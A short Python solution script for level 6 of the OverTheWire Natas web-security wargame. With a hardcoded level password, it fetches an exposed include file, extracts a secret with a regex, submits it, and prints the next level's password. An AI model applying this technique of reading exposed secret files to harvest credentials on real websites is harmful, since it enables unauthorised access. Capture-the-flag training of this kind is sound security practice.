#!/usr/bin/env python

import requests
import re

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

url = 'http://%s.natas.labs.overthewire.org/' % username

r_1 = requests.get(url+'includes/secret.inc', auth=(username, password))

key = re.findall('\$secret = \"(.*)\";', r_1.text)[0]

data = {'secret': key, 'submit': 'Submit+Query'}

r_2 = requests.post(url, auth=(username, password), data=data)

password = re.findall('(?<=natas7\sis\s)(.*)', r_2.text)[0]

print(password)